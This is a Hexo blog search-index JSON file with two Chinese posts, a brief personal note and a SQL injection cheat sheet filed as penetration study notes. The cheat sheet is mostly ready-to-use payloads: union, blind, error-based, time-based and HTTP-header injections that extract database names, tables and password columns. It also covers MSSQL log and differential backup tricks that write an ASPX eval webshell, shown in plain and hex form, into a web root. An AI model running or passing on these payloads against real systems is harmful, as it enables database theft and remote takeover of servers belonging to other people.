{"meta":{"title":"xiaoG","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"About","date":"2020-12-05T17:58:06.608Z","updated":"2020-12-05T17:58:06.608Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2020-12-05T17:58:06.608Z","updated":"2020-12-05T17:58:06.608Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2020-12-06T07:06:21.501Z","updated":"2020-12-06T07:06:21.501Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"sql注入总结","slug":"sql注入总结","date":"2020-12-06T10:06:52.000Z","updated":"2020-12-08T14:49:56.183Z","comments":true,"path":"wiki/sql注入总结/","link":"","permalink":"http://example.com/wiki/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","excerpt":"","text":"各种sql注入的收集以及利用sql注入的收集在任何与数据库有参数的传递的地方均可能出现sql注入。 如：搜索框，url中的参数，登录页面（后台页面中居多），搜索框，http头… 判断方法： 在参数中加一个 ′ 号，如果报错则存在又注入漏洞 数字型：若语句为id=1 and 1=1# 正常，若id=1 and 1=2#报错，则为数字型。 字符型：若语句为id=1’ and ‘1’ =’1’# 正常，若id=1’ and ‘1’ =’2’#报错，则为字符型。 sql注入类型union型最重要的是找到闭合的规则。 可以直接利用查询语句查询数据库内容（权限允许）。 order by 查询字段数。 查询当前数据库,当前mysql用户 1union select 1,user(),database() 查询当前数据库里面的表 1union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&quot;data_name&quot; 查询到敏感表名user，继续查询表里面的字段 1union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;user&quot; 查询字段，例如“id”、”passwd”的内容 1union select 1,id,passwd from user 布尔型盲注查看现象，能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，只存在两种状态，对或错。 只能通过注入语句，返回的页面有没有报错而判定信息。 先用 1and length(database())&gt;2 来猜数据库的长度，使用的是二分法。 再用 1and substr(database(),1,1)=&#x27;t&#x27; 来确定第一个字母，可用burp跑，26个字母,哪个字母返回正常则代表第一个字母就是它。 结合适合的长度进行猜解。 后面的所有信息都像union注入一般进行，但是要一个一个进行猜解，需要时间很长。 报错型注入注入点有sql的报错信息就可以进行报错注入 形如布尔盲注，只要猜解出闭合类型，返回正常即可进行注入 报错获取当前数据库语句： 1and updatexml(1,concat(0x7e,(select database()),0x7e),1) floor报错获取当前数据库： 1and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) 后面的信息获取语句形如union类型 时间盲注当页面有注入时，可以尝试加下面这个函数测试 1sleep(5); 如果有页面延迟5秒以上时则为时间盲注 接着猜出闭合的类型 形如布尔盲注一步一步获取信息 http头注入可注入的地方：cookie，Rerferer，User-Agent，X-Forwarded-For… 注入姿势 12345678GET / HTTP/1.1Host: www.example.comConnection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0&#x27;(select*from(select(sleep(20)))a) #Accept-Encoding: gzip, deflate, sdchAccept-Language: en-US,en;q=0.8,fr;q=0.6 sql注入—db_owner权限首先进行权限的判断 123and 1=(select IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;)) //判断是否是系统管理员and 1=(Select IS_MEMBER(&#x27;db_owner&#x27;)) //判断是否是库权限and 1=(Select IS_MEMBER(&#x27;public&#x27;)) getshell的前提首先得有db_owner权限 想办法获取网站的绝对路径 进行备份getshell Log备份Getshell姿势 1234567;alter database test set RECOVERY FULL--;create table cmd (a image)--;backup log test to disk = &#x27;c:/1.bak&#x27; with init--;insert into cmd (a) values (&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;%eval(Request.Item[&quot;hackdog&quot;],&quot;unsafe&quot;);%&gt;&#x27;)--;backup log test to disk = &#x27;C:/Users/Administrator/Desktop/wwwroot/xf.aspx&#x27;--;drop table cmd-- 差异备份Getshell姿势 12345678910111213141⾸先完整备份⼀次(c:\\ddd.bak为所备份未见)backup database 库名 to disk = &#x27;c:\\ddd.bak&#x27;;--2.创建表并插曲⼊数据create table [dbo].[dtest] ([cmd] [image]);insert into dtest(cmd)values(0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c28526571756573742e4974656d5b226861636b646f67225d2c22756e7361666522293b253e);--3.进⾏差异备份backup database 库名 to disk=&#x27;⽬标位置\\d.asp&#x27; WITH DIFFERENTIAL,FORMAT;--上⾯0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c28526571756573742e4974656d5b226861636b646f67225d2c22756e7361666522293b253e就是⼀句话⽊马的内容：&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;hackdog&quot;],&quot;unsafe&quot;);%&gt;","categories":[{"name":"渗透学习","slug":"渗透学习","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"再用博客","slug":"初用博客","date":"2020-12-06T07:12:46.000Z","updated":"2020-12-06T07:33:39.646Z","comments":true,"path":"wiki/初用博客/","link":"","permalink":"http://example.com/wiki/%E5%88%9D%E7%94%A8%E5%8D%9A%E5%AE%A2/","excerpt":"在此警醒自己​ 今天刚花了九牛二虎之力，昨天折腾了一晚上重新搭了一个hexo博客。因为以前的懒得用而荒废了。","text":"在此警醒自己​ 今天刚花了九牛二虎之力，昨天折腾了一晚上重新搭了一个hexo博客。因为以前的懒得用而荒废了。 ​ 在这里写下第一篇文章，提醒和警醒自己，不可再像以前一样懒惰，在这里记录下自己的学习和心路历程。","categories":[{"name":"随想","slug":"随想","permalink":"http://example.com/categories/%E9%9A%8F%E6%83%B3/"}],"tags":[{"name":"随想","slug":"随想","permalink":"http://example.com/tags/%E9%9A%8F%E6%83%B3/"}]}],"categories":[{"name":"渗透学习","slug":"渗透学习","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"},{"name":"随想","slug":"随想","permalink":"http://example.com/categories/%E9%9A%8F%E6%83%B3/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"随想","slug":"随想","permalink":"http://example.com/tags/%E9%9A%8F%E6%83%B3/"}]}